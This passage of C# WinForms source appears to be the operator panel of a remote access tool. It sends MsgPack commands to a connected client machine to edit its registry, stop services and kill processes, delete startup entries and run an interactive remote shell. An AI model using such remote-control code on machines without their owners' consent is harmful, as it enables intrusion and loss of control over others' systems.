        TreeNode treeNode = CreateNode(subKey.Key, subKey.Key, subKey.Data);
        parent.Nodes.Add(treeNode);
        if (subKey.HasSubKeys)
        {
            treeNode.Nodes.Add(new TreeNode());
        }
        return treeNode;
    }

    private TreeNode CreateNode(string key, string text, object tag)
    {
        return new TreeNode
        {
            Text = text,
            Name = key,
            Tag = tag
        };
    }

    public void AddKeys(string rootKey, RegistrySeeker.RegSeekerMatch[] matches)
    {
        if (string.IsNullOrEmpty(rootKey))
        {
            tvRegistryDirectory.BeginUpdate();
            foreach (RegistrySeeker.RegSeekerMatch match in matches)
            {
                AddRootKey(match);
            }
            tvRegistryDirectory.SelectedNode = tvRegistryDirectory.Nodes[0];
            tvRegistryDirectory.EndUpdate();
            return;
        }
        TreeNode treeNode = GetTreeNode(rootKey);
        if (treeNode != null)
        {
            tvRegistryDirectory.BeginUpdate();
            foreach (RegistrySeeker.RegSeekerMatch subKey in matches)
            {
                AddKeyToTree(treeNode, subKey);
            }
            treeNode.Expand();
            tvRegistryDirectory.EndUpdate();
        }
    }

    public void CreateNewKey(string rootKey, RegistrySeeker.RegSeekerMatch match)
    {
        TreeNode treeNode = GetTreeNode(rootKey);
        TreeNode treeNode2 = AddKeyToTree(treeNode, match);
        treeNode2.EnsureVisible();
        tvRegistryDirectory.SelectedNode = treeNode2;
        treeNode2.Expand();
        tvRegistryDirectory.LabelEdit = true;
        treeNode2.BeginEdit();
    }

    public void DeleteKey(string rootKey, string subKey)
    {
        TreeNode treeNode = GetTreeNode(rootKey);
        if (treeNode.Nodes.ContainsKey(subKey))
        {
            treeNode.Nodes.RemoveByKey(subKey);
        }
    }

    public void RenameKey(string rootKey, string oldName, string newName)
    {
        TreeNode treeNode = GetTreeNode(rootKey);
        if (treeNode.Nodes.ContainsKey(oldName))
        {
            treeNode.Nodes[oldName].Text = newName;
            treeNode.Nodes[oldName].Name = newName;
            tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
        }
    }

    private TreeNode GetTreeNode(string path)
    {
        string[] array = path.Split('\\');
        TreeNode treeNode = tvRegistryDirectory.Nodes[array[0]];
        if (treeNode == null)
        {
            return null;
        }
        int num = 1;
        while (true)
        {
            if (num < array.Length)
            {
                treeNode = treeNode.Nodes[array[num]];
                if (treeNode == null)
                {
                    break;
                }
                num++;
                continue;
            }
            return treeNode;
        }
        return null;
    }

    public void CreateValue(string keyPath, RegistrySeeker.RegValueData value)
    {
        TreeNode treeNode = GetTreeNode(keyPath);
        if (treeNode != null)
        {
            List<RegistrySeeker.RegValueData> list = ((RegistrySeeker.RegValueData[])treeNode.Tag).ToList();
            list.Add(value);
            treeNode.Tag = list.ToArray();
            if (tvRegistryDirectory.SelectedNode == treeNode)
            {
                RegistryValueLstItem registryValueLstItem = new RegistryValueLstItem(value);
                lstRegistryValues.Items.Add(registryValueLstItem);
                lstRegistryValues.SelectedIndices.Clear();
                registryValueLstItem.Selected = true;
                lstRegistryValues.LabelEdit = true;
                registryValueLstItem.BeginEdit();
            }
            tvRegistryDirectory.SelectedNode = treeNode;
        }
    }

    public void DeleteValue(string keyPath, string valueName)
    {
        TreeNode treeNode = GetTreeNode(keyPath);
        if (treeNode == null)
        {
            return;
        }
        if (!RegValueHelper.IsDefaultValue(valueName))
        {
            treeNode.Tag = ((RegistrySeeker.RegValueData[])treeNode.Tag).Where((RegistrySeeker.RegValueData value) => value.Name != valueName).ToArray();
            if (tvRegistryDirectory.SelectedNode == treeNode)
            {
                lstRegistryValues.Items.RemoveByKey(valueName);
            }
        }
        else
        {
            RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == valueName);
            if (tvRegistryDirectory.SelectedNode == treeNode)
            {
                RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == valueName);
                if (registryValueLstItem != null)
                {
                    registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(null);
                }
            }
        }
        tvRegistryDirectory.SelectedNode = treeNode;
    }

    public void RenameValue(string keyPath, string oldName, string newName)
    {
        TreeNode treeNode = GetTreeNode(keyPath);
        if (treeNode == null)
        {
            return;
        }
        RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == oldName);
        regValueData.Name = newName;
        if (tvRegistryDirectory.SelectedNode == treeNode)
        {
            RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == oldName);
            if (registryValueLstItem != null)
            {
                registryValueLstItem.RegName = newName;
            }
        }
        tvRegistryDirectory.SelectedNode = treeNode;
    }

    public void ChangeValue(string keyPath, RegistrySeeker.RegValueData value)
    {
        TreeNode treeNode = GetTreeNode(keyPath);
        if (treeNode == null)
        {
            return;
        }
        RegistrySeeker.RegValueData dest = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == value.Name);
        ChangeRegistryValue(value, dest);
        if (tvRegistryDirectory.SelectedNode == treeNode)
        {
            RegistryValueLstItem registryValueLstItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == value.Name);
            if (registryValueLstItem != null)
            {
                registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
            }
        }
        tvRegistryDirectory.SelectedNode = treeNode;
    }

    private void ChangeRegistryValue(RegistrySeeker.RegValueData source, RegistrySeeker.RegValueData dest)
    {
        if (source.Kind == dest.Kind)
        {
            dest.Data = source.Data;
        }
    }

    private void lstRegistryValues_AfterLabelEdit(object sender, LabelEditEventArgs e)
    {
        if (e.Label != null && tvRegistryDirectory.SelectedNode != null)
        {
            e.CancelEdit = true;
            int item = e.Item;
            if (e.Label.Length > 0)
            {
                if (lstRegistryValues.Items.ContainsKey(e.Label))
                {
                    MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    lstRegistryValues.Items[item].BeginEdit();
                    return;
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue";
                msgPack.ForcePathObject("OldValueName").AsString = lstRegistryValues.Items[item].Name;
                msgPack.ForcePathObject("NewValueName").AsString = e.Label;
                msgPack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                lstRegistryValues.LabelEdit = false;
            }
            else
            {
                MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                lstRegistryValues.Items[item].BeginEdit();
            }
        }
        else
        {
            lstRegistryValues.LabelEdit = false;
        }
    }

    private void CreateListViewMenuStrip()
    {
        ToolStripMenuItem toolStripMenuItem = modifyToolStripMenuItem;
        bool enabled = (modifyBinaryDataToolStripMenuItem.Enabled = lstRegistryValues.SelectedItems.Count == 1);
        toolStripMenuItem.Enabled = enabled;
        renameToolStripMenuItem1.Enabled = lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);
        deleteToolStripMenuItem1.Enabled = tvRegistryDirectory.SelectedNode != null && lstRegistryValues.SelectedItems.Count > 0;
    }

    private void lstRegistryValues_MouseUp(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Right)
        {
            Point position = new Point(e.X, e.Y);
            if (lstRegistryValues.GetItemAt(position.X, position.Y) == null)
            {
                lst_ContextMenuStrip.Show(lstRegistryValues, position);
                return;
            }
            CreateListViewMenuStrip();
            selectedItem_ContextMenuStrip.Show(lstRegistryValues, position);
        }
    }

    private void lstRegistryValues_KeyUp(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Delete && GetDeleteState())
        {
            deleteRegistryValue_Click(this, e);
        }
    }

    private void StartToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (!Admin)
        {
            MessageBox.Show(this, "The client is not running as an administrator so you can't start the service!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
        else
        {
            if (ListServices.Rows.Count <= 0)
            {
                return;
            }
            IEnumerator enumerator = null;
            try
            {
                enumerator = ListServices.SelectedRows.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "Services";
                    msgPack.ForcePathObject("Command").AsString = "Start";
                    msgPack.ForcePathObject("ServicesStart").AsString = dataGridViewRow.Cells[1].Value.ToString();
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }
    }

    private void StopToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (!Admin)
        {
            MessageBox.Show(this, "The client is not running as an administrator so you can't stop the service!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
        else
        {
            if (ListServices.Rows.Count <= 0)
            {
                return;
            }
            IEnumerator enumerator = null;
            try
            {
                enumerator = ListServices.SelectedRows.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "Services";
                    msgPack.ForcePathObject("Command").AsString = "Stop";
                    msgPack.ForcePathObject("ServicesStart").AsString = dataGridViewRow.Cells[1].Value.ToString();
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }
    }

    private void RefreshToolStripMenuItem2_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Services";
            msgPack.ForcePathObject("Command").AsString = "List";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void RefreshConnectionTCP_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Connection";
            msgPack.ForcePathObject("Command").AsString = "List";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void KillConnect_Click(object sender, EventArgs e)
    {
        if (ListConnection.Rows.Count == 0)
        {
            return;
        }
        IEnumerator enumerator = null;
        try
        {
            enumerator = ListConnection.SelectedRows.GetEnumerator();
            while (enumerator.MoveNext())
            {
                DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Connection";
                msgPack.ForcePathObject("Command").AsString = "Kill";
                msgPack.ForcePathObject("PID").AsString = dataGridViewRow.Cells[2].Value.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void RefreshTaskManager_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "TaskManager";
            msgPack.ForcePathObject("Command").AsString = "List";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void KillProcess_Click(object sender, EventArgs e)
    {
        if (ListProcess.Rows.Count == 0)
        {
            return;
        }
        IEnumerator enumerator = null;
        try
        {
            enumerator = ListProcess.SelectedRows.GetEnumerator();
            while (enumerator.MoveNext())
            {
                DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "TaskManager";
                msgPack.ForcePathObject("Command").AsString = "Kill";
                msgPack.ForcePathObject("PID").AsString = dataGridViewRow.Cells[2].Value.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void RestartProcess_Click(object sender, EventArgs e)
    {
        if (ListProcess.Rows.Count <= 0)
        {
            return;
        }
        IEnumerator enumerator = null;
        try
        {
            enumerator = ListProcess.SelectedRows.GetEnumerator();
            while (enumerator.MoveNext())
            {
                DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "TaskManager";
                msgPack.ForcePathObject("Command").AsString = "Restart";
                msgPack.ForcePathObject("PID").AsString = dataGridViewRow.Cells[2].Value.ToString();
                msgPack.ForcePathObject("Path").AsString = dataGridViewRow.Cells[3].Value.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
    }

    private void CommandCmd_KeyDown(object sender, KeyEventArgs e)
    {
        if (Client == null)
        {
            return;
        }
        MsgPack msgPack = new MsgPack();
        if (e.KeyData != Keys.Return || string.IsNullOrWhiteSpace(CommandCmd.Text))
        {
            return;
        }
        if (CommandCmd.Text == "cls".ToLower())
        {
            BoxCmd.Clear();
            CommandCmd.Clear();
        }
        if (CommandCmd.Text == "exit".ToLower())
        {
            try
            {
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "shellWriteInput";
                msgPack.ForcePathObject("WriteInput").AsString = "exit";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                BoxCmd.Clear();
                PowerCommand.Text = "Start";
                CommandType.Enabled = true;
            }
            catch
            {
            }
        }
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "shellWriteInput";
        msgPack.ForcePathObject("WriteInput").AsString = CommandCmd.Text;
        ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        CommandCmd.Clear();
    }

    private void PowerCommand_Click(object sender, EventArgs e)
    {
        string asString = CommandType.Text;
        if (PowerCommand.Text == "Start")
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "shell";
                msgPack.ForcePathObject("Type").AsString = asString;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                BoxCmd.Clear();
                PowerCommand.Text = "Stop";
                CommandType.Enabled = false;
                return;
            }
            catch
            {
                return;
            }
        }
        try
        {
            MsgPack msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Packet").AsString = "shellWriteInput";
            msgPack2.ForcePathObject("WriteInput").AsString = "exit";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            BoxCmd.Clear();
            PowerCommand.Text = "Start";
            CommandType.Enabled = true;
        }
        catch
        {
        }
    }

    private void CommandType_SelectedIndexChanged(object sender, EventArgs e)
    {
        if (CommandType.SelectedIndex == 0)
        {
            BoxCmd.BackColor = Color.Black;
            BoxCmd.ForeColor = Color.White;
        }
        else
        {
            BoxCmd.BackColor = Color.FromArgb(1, 36, 86);
            BoxCmd.ForeColor = Color.White;
        }
    }

    private void RefreshListStartup_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Startup";
            msgPack.ForcePathObject("Command").AsString = "List";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void DeleteKeyStartup_Click(object sender, EventArgs e)
    {
        foreach (object selectedItem in ListStartup.SelectedItems)
        {
            _ = selectedItem;
            if (ListStartup.SelectedItems[0].ImageIndex == 0)
            {
                if (ListStartup.SelectedItems[0].Group.Header.StartsWith("HKEY_LOCAL_MACHINE") && !Admin)
                {
                    MessageBox.Show(this, "The client is not running as an administrator so you can't delete!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    break;
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Startup";
                msgPack.ForcePathObject("Command").AsString = "DeleteSubKey";
                msgPack.ForcePathObject("SubKey").AsString = ListStartup.SelectedItems[0].Group.Header + "\\".ToString();
                msgPack.ForcePathObject("ValueName").AsString = ListStartup.SelectedItems[0].Text.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "Startup";
                msgPack2.ForcePathObject("Command").AsString = "DeleteStartup";
                msgPack2.ForcePathObject("StartupName").AsString = ListStartup.SelectedItems[0].Text.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            }
        }
    }

    private void PowerPerformance_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            if (PowerPerformance.Text == "Start")
            {
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Performance";
                msgPack.ForcePathObject("Command").AsString = "Start";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                PowerPerformance.Enabled = false;
                PowerPerformance.Text = "Started...";
            }
            else
            {
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Performance";
                msgPack.ForcePathObject("Command").AsString = "Stop";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                PowerPerformance.Enabled = false;
                PowerPerformance.Text = "Stoped...";
            }
        }
        catch
        {
        }
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        try
        {
            if (PowerCommand.Text != "Start")
            {
                MessageBox.Show(this, "Please stop tapping at the command prompt before exiting\r\n", "Manager Command Prompt!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
        }
        catch
        {
        }
        Close();
    }

    private void Manager_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
            {
                ThreadPool.QueueUserWorkItem(delegate
                {
                    Client?.Disconnected();
                });
                Close();
            }
        }
        catch
        {
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.Manager));
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.ListViewGroup listViewGroup = new System.Windows.Forms.ListViewGroup("Folder", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup2 = new System.Windows.Forms.ListViewGroup("Devices and Drives", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup3 = new System.Windows.Forms.ListViewGroup("Folder", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup4 = new System.Windows.Forms.ListViewGroup("Devices and Drives", System.Windows.Forms.HorizontalAlignment.Left);
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties9 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties10 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties11 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties12 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle17 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle18 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle19 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle20 = new System.Windows.Forms.DataGridViewCellStyle();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties13 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties14 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties15 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties16 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        System.Windows.Forms.ListViewGroup listViewGroup5 = new System.Windows.Forms.ListViewGroup("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup6 = new System.Windows.Forms.ListViewGroup("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup7 = new System.Windows.Forms.ListViewGroup("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup8 = new System.Windows.Forms.ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup9 = new System.Windows.Forms.ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup10 = new System.Windows.Forms.ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", System.Windows.Forms.HorizontalAlignment.Left);
        System.Windows.Forms.ListViewGroup listViewGroup11 = new System.Windows.Forms.ListViewGroup("Startup Folder", System.Windows.Forms.HorizontalAlignment.Left);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.TitlrPage = new Bunifu.UI.WinForms.BunifuLabel();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.bunifuLabel7 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.PaneControll = new System.Windows.Forms.Panel();
        this.ButDownload = new Guna.UI2.WinForms.Guna2Button();
        this.ButCmd = new Guna.UI2.WinForms.Guna2Button();
        this.ButStartup = new Guna.UI2.WinForms.Guna2Button();
        this.ButTaskManager = new Guna.UI2.WinForms.Guna2Button();
        this.ButConnection = new Guna.UI2.WinForms.Guna2Button();
        this.ButLogs = new Guna.UI2.WinForms.Guna2Button();
        this.ButRegistry = new Guna.UI2.WinForms.Guna2Button();
        this.ButServices = new Guna.UI2.WinForms.Guna2Button();
        this.ButFiles = new Guna.UI2.WinForms.Guna2Button();
        this.ButInstalled = new Guna.UI2.WinForms.Guna2Button();
        this.ButInfo = new Guna.UI2.WinForms.Guna2Button();
        this.PageManager = new Bunifu.UI.WinForms.BunifuPages();
        this.PageInfo = new System.Windows.Forms.TabPage();
        this.Panel1 = new System.Windows.Forms.Panel();
        this.CountInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.GetInfo = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ListInfo = new Guna.UI2.WinForms.Guna2DataGridView();
        this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexMuneInfo = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.saveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.DownTypeInfo = new Bunifu.UI.WinForms.BunifuDropdown();
        this.label7 = new System.Windows.Forms.Label();
        this.PageInstall = new System.Windows.Forms.TabPage();
        this.Panel2 = new System.Windows.Forms.Panel();
        this.ListInstalled = new Guna.UI2.WinForms.Guna2DataGridView();
        this.Column1 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexMuneInstalled = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.unistallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.PageFileManager = new System.Windows.Forms.TabPage();
        this.Panel3 = new System.Windows.Forms.Panel();
        this.PanelListFileManager = new System.Windows.Forms.Panel();
        this.AeroListView1 = new Server.Helper.AeroListView();
        this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
        this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
        this.MG = new System.Windows.Forms.ImageList(this.components);
        this.imageList1 = new System.Windows.Forms.ImageList(this.components);
        this.AreListview2 = new Server.Helper.AeroListView();
        this.ColName = new System.Windows.Forms.ColumnHeader();
        this.ColDate = new System.Windows.Forms.ColumnHeader();
        this.ColType = new System.Windows.Forms.ColumnHeader();
        this.ColSize = new System.Windows.Forms.ColumnHeader();
